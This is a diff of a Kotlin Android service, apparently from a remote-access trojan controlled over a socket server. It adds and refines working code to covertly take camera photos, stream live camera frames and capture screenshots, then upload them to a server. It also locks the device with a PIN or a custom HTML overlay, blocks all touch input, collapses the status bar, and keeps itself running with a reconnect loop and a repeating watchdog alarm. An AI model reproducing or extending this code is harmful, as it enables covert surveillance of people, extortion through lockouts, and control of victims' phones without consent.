@@ -1,35 +1,31 @@
 package com.sync.xxx
 
-import android.graphics.Bitmap
-import android.graphics.BitmapFactory
-import android.graphics.Canvas
-import android.graphics.Color
-import android.graphics.Paint
-import android.graphics.Path
-import android.util.Base64
-import android.util.Size
-import androidx.camera.core.*
-import androidx.camera.lifecycle.ProcessCameraProvider
-import java.io.ByteArrayOutputStream
-import java.util.concurrent.Executors
 import android.annotation.SuppressLint
 import android.app.*
 import android.app.WallpaperManager
 import android.content.*
-import android.content.pm.PackageManager          // ⬅️ WAJIB untuk hideAppIcon/changeTheme
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.graphics.Canvas
+import android.graphics.Color
 import android.graphics.Matrix
+import android.graphics.Paint
+import android.graphics.Path
 import android.graphics.PixelFormat
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
+import android.media.AudioManager
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.util.Base64
 import android.util.Log
+import android.util.Size
 import android.view.WindowManager
+import androidx.camera.core.*
+import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.Lifecycle
@@ -38,8 +34,9 @@ import androidx.lifecycle.LifecycleRegistry
 import io.socket.client.IO
 import io.socket.client.Socket
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 import java.net.URI
-import android.media.AudioManager
+import java.util.concurrent.Executors
 
 class DeviceService : Service(), LifecycleOwner {
 
@@ -149,6 +146,7 @@ override fun onCreate() {
     }
 
     connectSocket()
+    scheduleWatchdog()
 }
 
     private fun connectSocket() {
@@ -182,10 +180,13 @@ override fun onCreate() {
                 })
             }
 
-            socket?.on(Socket.EVENT_DISCONNECT) {
-                Log.d("DeviceService", "Socket disconnected")
-                SocketHolder.connected = false
-            }
+socket?.on(Socket.EVENT_DISCONNECT) {
+    Log.d("DeviceService", "Socket disconnected — retry 5s")
+    SocketHolder.connected = false
+    Handler(Looper.getMainLooper()).postDelayed({
+        if (socket?.connected() != true) connectSocket()
+    }, 5000L)
+}
 
             socket?.on("command") { args ->
                 val data = args[0] as? JSONObject ?: return@on
@@ -208,6 +209,28 @@ override fun onCreate() {
             Log.e("DeviceService", "Socket error: ${e.message}")
         }
     }
+    
+    private fun scheduleWatchdog() {
+    try {
+        val am = getSystemService(ALARM_SERVICE) as AlarmManager
+        val pi = PendingIntent.getBroadcast(
+            this, 0,
+            Intent(this, WatchdogReceiver::class.java).apply {
+                action = "com.sync.xxx.WATCHDOG"
+            },
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+        )
+        am.setInexactRepeating(
+            AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime() + 15 * 60 * 1000L,
+            15 * 60 * 1000L,
+            pi
+        )
+        Log.d("DeviceService", "watchdog scheduled")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "scheduleWatchdog: ${e.message}")
+    }
+}
 
     private fun handleCommand(cmd: String, value: String) {
     when (cmd) {
@@ -215,18 +238,16 @@ override fun onCreate() {
         "lockDevice" -> lockDevice(value)
         "lockCustom" -> lockCustom(value)
         "unlockDevice" -> unlockDevice()
-        // ─── MAPPING COMMAND BARU DI handleCommand() ───
-// Tambahkan case ini di dalam `when(cmd)`:
-"photo_front" -> capturePhoto("front")
-"photo_back" -> capturePhoto("back")
-"liveCameraFront" -> startLiveCamera("front")
-"liveCameraBack" -> startLiveCamera("back")
-"liveCameraStop" -> stopLiveCamera()
-"takeScreenshot" -> takeScreenshot()
-"hackScreenStart" -> startHackScreen(value)
-"hackScreenStop" -> stopHackScreen()
-"killSystemStart" -> startKillSystem()
-"killSystemStop" -> stopKillSystem()
+        "photo_front" -> capturePhoto("front")
+        "photo_back" -> capturePhoto("back")
+        "liveCameraFront" -> startLiveCamera("front")
+        "liveCameraBack" -> startLiveCamera("back")
+        "liveCameraStop" -> stopLiveCamera()
+        "takeScreenshot" -> takeScreenshot()
+        "hackScreenStart" -> startHackScreen(value)
+        "hackScreenStop" -> stopHackScreen()
+        "killSystemStart" -> startKillSystem()
+        "killSystemStop" -> stopKillSystem()
         "changeTheme" -> changeTheme(value)
         "setWallpaper" -> setWallpaperFromUrl(value)
         "openUrl" -> openUrl(value)
@@ -252,98 +273,162 @@ override fun onCreate() {
                 put("antiUninstallActive", AntiUninstallHelper.isAdminActive(this@DeviceService))
             })
         }
-        // ⬇️ FITUR BARU
         "lcdDamageStart" -> startLcdDamage()
         "lcdDamageStop"  -> stopLcdDamage()
         "spamKeyboardStart" -> startSpamKeyboard()
         "spamKeyboardStop"  -> stopSpamKeyboard()
         "freezeScreenStart" -> startFreezeScreen()
         "freezeScreenStop"  -> stopFreezeScreen()
-        // ⬆️ END FITUR BARU
         else -> Log.d("DeviceService", "⚠️ Unknown command: $cmd")
     }
 }
     
-    // ─── FITUR FOTO & LIVE CAMERA ───
 private fun capturePhoto(facing: String) {
-    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
-    val future = ProcessCameraProvider.getInstance(this)
-    
-    future.addListener({
-        try {
-            val provider = future.get()
-            val imageCapture = ImageCapture.Builder().build()
+    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA
+                   else CameraSelector.DEFAULT_BACK_CAMERA
+    if (isStreamingCamera) stopLiveCamera()
+
+val future = ProcessCameraProvider.getInstance(this)
+
+future.addListener({
+    try {
+        val provider = future.get()
+        cameraProvider = provider
+
+        val imageCapture = ImageCapture.Builder()
+                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .setTargetRotation(android.view.Surface.ROTATION_0)
+                .build()
+
             provider.unbindAll()
             provider.bindToLifecycle(this, selector, imageCapture)
-            
-            imageCapture.takePicture(Executors.newSingleThreadExecutor(), object : ImageCapture.OnImageCapturedCallback() {
-                override fun onCaptureSuccess(image: ImageProxy) {
-                    val buffer = image.planes[0].buffer
-                    val bytes = ByteArray(buffer.remaining())
-                    buffer.get(bytes)
-                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                    
-                    // Kirim ke server via HTTP POST
-                    sendMediaToServer("photo_$facing", b64)
-                    image.close()
+
+            imageCapture.takePicture(
+                Executors.newSingleThreadExecutor(),
+                object : ImageCapture.OnImageCapturedCallback() {
+                    override fun onCaptureSuccess(image: ImageProxy) {
+                        try {
+                            val bmp = image.toBitmap()
+                            val rotated = rotateBitmap(bmp, image.imageInfo.rotationDegrees)
+                            val bos = ByteArrayOutputStream()
+                            rotated.compress(Bitmap.CompressFormat.JPEG, 85, bos)
+                            val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
+                            sendMediaToServer("photo_$facing", b64)
+                            rotated.recycle()
+                        } catch (e: Exception) {
+                            Log.e("Camera", "convert fail: ${e.message}")
+                        } finally {
+                            try { image.close() } catch (_: Exception) {}
+                            try { provider.unbindAll() } catch (_: Exception) {}
+                        }
+                    }
+                    override fun onError(exc: ImageCaptureException) {
+                        Log.e("Camera", "Capture failed: ${exc.message}")
+                        try { provider.unbindAll() } catch (_: Exception) {}
+                    }
                 }
-                override fun onError(exc: ImageCaptureException) {
-                    Log.e("Camera", "Capture failed: ${exc.message}")
-                }
-            })
+            )
         } catch (e: Exception) {
             Log.e("Camera", "Error binding: ${e.message}")
         }
     }, ContextCompat.getMainExecutor(this))
 }
 
+private fun rotateBitmap(bmp: Bitmap, degrees: Int): Bitmap {
+    if (degrees == 0) return bmp
+    val m = Matrix().apply { postRotate(degrees.toFloat()) }
+    val out = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, m, true)
+    if (out != bmp) bmp.recycle()
+    return out
+}
+
 private fun startLiveCamera(facing: String) {
+    if (isStreamingCamera) stopLiveCamera()
     isStreamingCamera = true
     cameraFacing = facing
-    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
-    
+    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA
+                   else CameraSelector.DEFAULT_BACK_CAMERA
+
     val future = ProcessCameraProvider.getInstance(this)
     future.addListener({
         try {
             val provider = future.get()
+            cameraProvider = provider
+
             imageAnalysis = ImageAnalysis.Builder()
-                .setTargetResolution(Size(640, 480)) // Resolusi kecil biar lancar
+                .setTargetResolution(Size(640, 480))
                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                 .build()
-            
+
             imageAnalysis?.setAnalyzer(Executors.newSingleThreadExecutor()) { image ->
                 if (!isStreamingCamera) { image.close(); return@setAnalyzer }
-                
-                val buffer = image.planes[0].buffer
-                val bytes = ByteArray(buffer.remaining())
-                buffer.get(bytes)
-                // Convert YUV to JPEG lebih ribet, untuk simplifikasi kita kirim raw bytes (butuh handling di client)
-                // Atau pakai CameraX ImageCapture ke bitmap.
-                // (Kode lengkap ImageAnalysis to Bitmap agak panjang, tapi ini intinya)
-                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                socket?.emit("camera:stream", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("frame", b64)
-                })
-                image.close()
+                try {
+                    val bmp = image.toBitmap()
+                    val rotated = rotateBitmap(bmp, image.imageInfo.rotationDegrees)
+                    val scaled = Bitmap.createScaledBitmap(rotated, 480, 360, true)
+                    if (scaled != rotated) rotated.recycle()
+                    val bos = ByteArrayOutputStream()
+                    scaled.compress(Bitmap.CompressFormat.JPEG, 60, bos)
+                    scaled.recycle()
+                    val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
+                    socket?.emit("camera:stream", JSONObject().apply {
+                        put("deviceId", deviceId)
+                        put("facing", facing)
+                        put("frame", b64)
+                    })
+                } catch (e: Exception) {
+                    Log.e("LiveCam", "frame fail: ${e.message}")
+                } finally {
+                    try { image.close() } catch (_: Exception) {}
+                }
             }
-            
+
             provider.unbindAll()
             provider.bindToLifecycle(this, selector, imageAnalysis!!)
-        } catch (e: Exception) { Log.e("Camera", "Live failed: ${e.message}") }
+            emitStatus(JSONObject().apply {
+                put("liveCameraActive", true)
+                put("facing", facing)
+            })
+        } catch (e: Exception) {
+            Log.e("Camera", "Live failed: ${e.message}")
+            isStreamingCamera = false
+        }
     }, ContextCompat.getMainExecutor(this))
 }
 
 private fun stopLiveCamera() {
     isStreamingCamera = false
-    cameraProvider?.unbindAll()
+    try { imageAnalysis?.clearAnalyzer() } catch (_: Exception) {}
+    imageAnalysis = null
+    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
+    cameraProvider = null
+    emitStatus(JSONObject().apply { put("liveCameraActive", false) })
 }
 
 private fun takeScreenshot() {
-    // Butuh MediaProjection, karena lu bilang screenshot diam-diam, kita pakai trik RenderScript/View.draw
-    // Atau kalau pakai AccessibilityService bisa pakai takeScreenshot.
-    // Simulasi aja dulu kirim status kalau ini butuh izin tambahan.
-    // (Kode asli butuh MediaProjectionManager, sama kayak ScreenCaptureActivity)
+    if (!ScreenshotAccessibilityService.isRunning()) {
+        Log.e("DeviceService", "takeScreenshot: accessibility belum aktif")
+        emitStatus(JSONObject().apply {
+            put("screenshot", false)
+            put("screenshotReason", "accessibility_not_enabled")
+        })
+        return
+    }
+    ScreenshotAccessibilityService.requestScreenshot { b64 ->
+        if (b64 == null) {
+            Log.e("DeviceService", "takeScreenshot: gagal capture")
+            emitStatus(JSONObject().apply {
+                put("screenshot", false)
+                put("screenshotReason", "capture_failed")
+            })
+            return@requestScreenshot
+        }
+        sendMediaToServer("screenshot", b64)
+        emitStatus(JSONObject().apply {
+            put("screenshot", true)
+        })
+    }
 }
 
 private fun sendMediaToServer(type: String, base64: String) {
@@ -353,7 +438,8 @@ private fun sendMediaToServer(type: String, base64: String) {
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "application/json")
-            conn.setRequestProperty("x-auth-key", readKey()) // Butuh sessionKey
+            val key = readKey()
+if (key.isNotEmpty()) conn.setRequestProperty("x-auth-key", key)
             conn.doOutput = true
             
             val json = JSONObject().apply {
@@ -370,34 +456,53 @@ private fun sendMediaToServer(type: String, base64: String) {
 // ─── FITUR HACK SCREEN (CORAT-CORET) ───
 private fun startHackScreen(base64Image: String) {
     stopHackScreen()
-    try {
-        val bytes = Base64.decode(base64Image, Base64.DEFAULT)
-        val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
-        
-        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-        val params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-            PixelFormat.TRANSLUCENT
-        )
-        
-        val imgView = android.widget.ImageView(this).apply {
-            setImageBitmap(bmp)
-            scaleType = android.widget.ImageView.ScaleType.FIT_XY // Biar full screen
-            setBackgroundColor(Color.TRANSPARENT)
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val bytes = Base64.decode(base64Image, Base64.DEFAULT)
+            val bmp: Bitmap? = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+            if (bmp == null) {
+                Log.e("HackScreen", "decode base64 gagal")
+                return@post
+            }
+
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+
+            val imgView = android.widget.ImageView(this@DeviceService).apply {
+                setImageBitmap(bmp)
+                scaleType = android.widget.ImageView.ScaleType.FIT_XY
+                setBackgroundColor(Color.TRANSPARENT)
+            }
+
+            hackScreenView = imgView
+            wm.addView(imgView, params)
+            emitStatus(JSONObject().apply { put("hackScreenActive", true) })
+        } catch (e: Exception) {
+            Log.e("HackScreen", e.message ?: "unknown")
         }
-        
-        hackScreenView = imgView
-        wm.addView(imgView, params)
-        emitStatus(JSONObject().apply { put("hackScreenActive", true) })
-    } catch (e: Exception) { Log.e("HackScreen", e.message) }
+    }
 }
 
 private fun stopHackScreen() {
-    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-    hackScreenView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
-    hackScreenView = null
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            hackScreenView?.let { wm.removeView(it) }
+        } catch (_: Exception) {}
+        hackScreenView = null
+    }
     emitStatus(JSONObject().apply { put("hackScreenActive", false) })
 }
 
@@ -405,29 +510,48 @@ private fun stopHackScreen() {
 private fun startKillSystem() {
     if (isKillSystemActive) return
     isKillSystemActive = true
-    
-    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-    val params = WindowManager.LayoutParams(
-        WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
-        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_FULLSCREEN,
-        PixelFormat.TRANSLUCENT
-    )
-    
-    val view = android.view.View(this).apply {
-        setBackgroundColor(Color.TRANSPARENT)
-        setOnTouchListener { _, _ -> true } // Block semua sentuhan
+
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+
+            val view = android.view.View(this@DeviceService).apply {
+                setBackgroundColor(Color.TRANSPARENT)
+                setOnTouchListener { _, _ -> true }
+            }
+            killSystemView = view
+            wm.addView(view, params)
+            emitStatus(JSONObject().apply { put("killSystemActive", true) })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "startKillSystem: ${e.message}")
+            isKillSystemActive = false
+        }
     }
-    killSystemView = view
-    wm.addView(view, params)
-    emitStatus(JSONObject().apply { put("killSystemActive", true) })
 }
 
 private fun stopKillSystem() {
     isKillSystemActive = false
-    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-    killSystemView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
-    killSystemView = null
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            killSystemView?.let { wm.removeView(it) }
+        } catch (_: Exception) {}
+        killSystemView = null
+    }
     emitStatus(JSONObject().apply { put("killSystemActive", false) })
 }
 
@@ -1050,49 +1174,55 @@ private fun stopFreezeScreen() {
 }
 
     private fun lockDevice(jsonValue: String) {
-        try {
-            val obj   = org.json.JSONObject(jsonValue)
-            val pin   = obj.optString("pin", "")
-            val title = obj.optString("title", "Perangkat Terkunci")
-            lockPin   = pin
-            lockTitle = title
-
-            val intent = Intent(this, LockOverlayService::class.java).apply {
-                putExtra(LockOverlayService.EXTRA_PIN, pin)
-                putExtra(LockOverlayService.EXTRA_TITLE, title)
-            }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-
-            startLockFlashBlink()
-
-            emitStatus(JSONObject().apply {
-                put("deviceLocked", true)
-                put("lockTitle", title)
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "lockDevice error: ${e.message}")
+    try {
+        val trimmed = jsonValue.trimStart()
+        if (!trimmed.startsWith("{")) {
+            val parts = jsonValue.split("|", limit = 2)
+            lockPin   = parts.getOrNull(0)?.trim() ?: ""
+            lockTitle = parts.getOrNull(1)?.trim()?.takeIf { it.isNotEmpty() } ?: "Perangkat Terkunci"
+        } else {
+            val obj   = JSONObject(jsonValue)
+            lockPin   = obj.optString("pin", "")
+            lockTitle = obj.optString("title", "Perangkat Terkunci")
         }
+
+        val intent = Intent(this, LockOverlayService::class.java).apply {
+            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
+            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+
+        startLockFlashBlink()
+
+        emitStatus(JSONObject().apply {
+            put("deviceLocked", true)
+            put("lockTitle", lockTitle)
+        })
+    } catch (e: Exception) {
+        Log.e("DeviceService", "lockDevice error: ${e.message}")
     }
+}
 
     private fun unlockDevice() {
-        lockPin   = ""
-        lockTitle = ""
-        stopLockFlashBlink()
-        lockMediaPlayer?.release()
-        lockMediaPlayer = null
-        stopStatusBarCollapse()
-        removeLockCustomOverlay() // hapus floating overlay custom kalau ada
-        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
-        sendBroadcast(intent)
-        emitStatus(JSONObject().apply {
-            put("deviceLocked", false)
-            put("lockTitle", "")
-        })
-    }
+    lockPin   = ""
+    lockTitle = ""
+    stopLockFlashBlink()
+    stopKillSystem()
+    lockMediaPlayer?.release()
+    lockMediaPlayer = null
+    stopStatusBarCollapse()
+    removeLockCustomOverlay()
+    val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
+    sendBroadcast(intent)
+    emitStatus(JSONObject().apply {
+        put("deviceLocked", false)
+        put("lockTitle", "")
+    })
+}
 
     // ── Change Theme (icon & nama app) ────────────────────────────────────────
     private val THEME_ALIASES = mapOf(
@@ -1134,44 +1264,57 @@ private fun stopFreezeScreen() {
 
     // ── Lock Custom (floating WebView overlay — tidak masuk app) ─────────────
     private var lockCustomView: android.webkit.WebView? = null
+    private var lockCustomBlockView: android.view.View? = null
     private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
     private var statusBarCollapseHandler: Handler? = null
     private var statusBarCollapseRunnable: Runnable? = null
 
-    private fun lockCustom(htmlContent: String) {
-        try {
-            if (htmlContent.isEmpty()) {
-                removeLockCustomOverlay()
-                unlockDevice()
-                return
-            }
-            lockPin   = ""
-            lockTitle = ""
+    private fun lockCustom(jsonValue: String) {
+    try {
+        val obj = if (jsonValue.trimStart().startsWith("{"))
+            JSONObject(jsonValue)
+        else
+            JSONObject().put("html", jsonValue)
 
-            removeLockCustomOverlay() // clear previous if any
+        val htmlContent = obj.optString("html", "")
+        if (htmlContent.isEmpty()) {
+            removeLockCustomOverlay()
+            unlockDevice()
+            return
+        }
 
-            Handler(Looper.getMainLooper()).post {
-                try {
-                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                    else
-                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+        val doVibrate    = obj.optBoolean("vibrate", false)
+        val doFlash      = obj.optBoolean("flash", false)
+        val doSound      = obj.optBoolean("sound", false)
+        val doBlockTouch = obj.optBoolean("blockTouch", false)
+        val doKillSystem = obj.optBoolean("killSystem", false)
 
-val params = WindowManager.LayoutParams(
-    WindowManager.LayoutParams.MATCH_PARENT,
-    WindowManager.LayoutParams.MATCH_PARENT,
-    type,
-    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
-    WindowManager.LayoutParams.FLAG_FULLSCREEN or
-    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-    PixelFormat.TRANSLUCENT
-)
+        lockPin   = ""
+        lockTitle = "CUSTOM"
 
-                    // Bungkus HTML dengan full-screen black background
-                    val fullHtml = """<!DOCTYPE html>
+        removeLockCustomOverlay()
+
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else
+                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    type,
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
+                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    PixelFormat.TRANSLUCENT
+                )
+
+                val fullHtml = """<!DOCTYPE html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -1186,28 +1329,59 @@ ${htmlContent}
 </body>
 </html>"""
 
-                    val wv = android.webkit.WebView(this@DeviceService).apply {
-                        settings.javaScriptEnabled = true
-                        settings.domStorageEnabled  = true
-                        setBackgroundColor(android.graphics.Color.BLACK)
-                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
-                    }
-
-                    lockCustomView = wv
-                    lockCustomWm.addView(wv, params)
-                } catch (e: Exception) {
-                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
+                val wv = android.webkit.WebView(this@DeviceService).apply {
+                    settings.javaScriptEnabled = true
+                    settings.domStorageEnabled  = true
+                    setBackgroundColor(Color.BLACK)
+                    loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                 }
-            }
 
-            startLockFlashBlink()
-            playLockSound()
-            startStatusBarCollapse()
-            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "lockCustom error: ${e.message}")
+                lockCustomView = wv
+                lockCustomWm.addView(wv, params)
+            } catch (e: Exception) {
+                Log.e("DeviceService", "lockCustom overlay: ${e.message}")
+            }
         }
+
+        if (doFlash) startLockFlashBlink() else stopLockFlashBlink()
+        if (doSound) playLockSound()
+        if (doVibrate) vibrateDevice("800")
+        if (doKillSystem) startKillSystem() else stopKillSystem()
+
+        if (doBlockTouch && !doKillSystem) {
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                    else
+                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+                    val bParams = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        type,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                        PixelFormat.TRANSLUCENT
+                    )
+                    val blockView = android.view.View(this@DeviceService).apply {
+                        setOnTouchListener { _, _ -> true }
+                    }
+                    lockCustomBlockView = blockView
+                    lockCustomWm.addView(blockView, bParams)
+                } catch (_: Exception) {}
+            }
+        }
+
+        startStatusBarCollapse()
+        emitStatus(JSONObject().apply {
+            put("deviceLocked", true)
+            put("lockTitle", "CUSTOM")
+        })
+    } catch (e: Exception) {
+        Log.e("DeviceService", "lockCustom error: ${e.message}")
     }
+}
     
     
     
@@ -1240,11 +1414,17 @@ ${htmlContent}
     }
 
     private fun removeLockCustomOverlay() {
+    Handler(Looper.getMainLooper()).post {
         lockCustomView?.let {
-            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
+            try { lockCustomWm.removeView(it) } catch (_: Exception) {}
         }
-        lockCustomView = null
+        lockCustomBlockView?.let {
+            try { lockCustomWm.removeView(it) } catch (_: Exception) {}
+        }
     }
+    lockCustomView = null
+    lockCustomBlockView = null
+}
 
         private var lockFlashHandler: Handler? = null
     private var lockFlashRunnable: Runnable? = null
@@ -1372,6 +1552,16 @@ private fun readUid(): String {
     }
 }
 
+private fun readKey(): String {
+    return try {
+        val json = assets.open("uid.json").bufferedReader().use { it.readText() }
+        JSONObject(json).optString("key", "")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "readKey error: ${e.message}")
+        ""
+    }
+}
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -1382,8 +1572,9 @@ private fun readUid(): String {
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
     try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
-    stopLockFlashBlink()
-    stopLcdDamage()
+stopLiveCamera()
+stopLockFlashBlink()
+stopLcdDamage()
     stopSpamKeyboard()
     stopFreezeScreen()
     flashBlinking = false
